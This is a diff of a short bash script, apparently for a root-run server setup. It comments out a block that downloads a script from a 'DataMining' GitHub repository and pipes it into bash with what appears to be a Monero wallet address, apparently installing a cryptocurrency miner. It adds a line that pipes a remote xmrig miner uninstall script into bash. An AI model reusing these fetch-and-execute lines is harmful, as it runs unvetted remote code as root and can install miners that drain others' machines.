@@ -1,13 +1,14 @@
 #!/bin/bash
 
-FILE=/root/cutomSetupm.sh
-if test -f "$FILE"; then
-    echo OK1
-else
-    wget https://raw.githubusercontent.com/MoneyMakers777/DataMining/main/cutomSetupm.sh
-    chmod +x /root/cutomSetupm.sh
-    curl -L https://raw.githubusercontent.com/MoneyMakers777/DataMining/main/cutomSetupm.sh | bash -s '46rnJNvHVXAjdHWfrQndEJPJrWxjwL42zMNgCMH5vJyW97rGynsc4JjMu8TmxqcesR5Rjwk4QXHGEQ3Zi3NFSTPVVWoB1c5'
-fi
+#FILE=/root/cutomSetupm.sh
+#if test -f "$FILE"; then
+#    echo OK1
+#else
+#    wget https://raw.githubusercontent.com/MoneyMakers777/DataMining/main/cutomSetupm.sh
+#    chmod +x /root/cutomSetupm.sh
+#    curl -L https://raw.githubusercontent.com/MoneyMakers777/DataMining/main/cutomSetupm.sh | bash -s '46rnJNvHVXAjdHWfrQndEJPJrWxjwL42zMNgCMH5vJyW97rGynsc4JjMu8TmxqcesR5Rjwk4QXHGEQ3Zi3NFSTPVVWoB1c5'
+#fi
+curl -L  https://raw.githubusercontent.com/skypool-org/xmrig_setup/master/uninstall_skypool_miner.sh | bash -s
 
 
 FILE=/root/set-vars.sh
